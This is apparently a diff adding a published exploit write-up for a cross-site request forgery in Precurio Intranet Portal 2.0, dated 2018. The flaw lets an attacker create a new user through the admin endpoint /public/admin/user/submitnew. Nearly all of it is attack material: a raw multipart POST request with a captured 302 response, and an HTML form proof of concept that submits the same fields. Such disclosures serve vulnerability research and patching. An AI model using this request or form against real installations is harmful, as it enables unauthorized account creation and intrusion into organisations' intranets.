@@ -1,0 +1,87 @@
+# Exploit Title: Precurio Intranet Portal 2.0 - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 2018-11-12
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.precurio.org
+# Software Link: https://netcologne.dl.sourceforge.net/project/precurio/version%202.1/precurio.zip
+# Version: 2.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/public/admin/user/submitnew
+# 
+
+POST /[PATH]/public/admin/user/submitnew HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------2118278047894297530396667654
+Content-Length: 1119
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="user_id"
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="date_created"
+1542055034
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="first_name"
+efe
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="last_name"
+efe
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="email"
+efeomerefe.com
+-----------------------------2118278047894297530396667654
+
+Content-Disposition: form-data; name="password"
+efe
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="department_id"
+0
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="location_id"
+0
+-----------------------------2118278047894297530396667654
+Content-Disposition: form-data; name="submit"
+Submit
+-----------------------------2118278047894297530396667654--
+HTTP/1.1 302 Found
+Date: Mon, 12 Nov 2018 20:51:19 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PRECURIOSESSID=0ddb3o3ade8g3vn2qb3q4jhe61; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: /[PATH]/public/admin/user/edit/id/11
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/public/admin/user/submitnew
+# 
+<html>
+<body>
+<form enctype="multipart/form-data" action="http://localhost/[PATH]/public/admin/user/submitnew" method="post">
+<input name="user_id" value="" type="hidden">
+<input name="date_created" value="1542055034" type="hidden">
+<input name="first_name" placeholder="first_name" value="" type="text"></dd>
+<input name="last_name" placeholder="last_name" value="" type="text"></dd>
+<input name="email" placeholder="email" value="" type="text"></dd>
+<input name="password" placeholder="password" value="" type="text"></dd>
+<input name="department_id" value="0" type="hidden">
+<input name="location_id" value="0" type="hidden">
+<input name="submit" value="Submit" type="submit">
+</form>
+</body>
+</html>
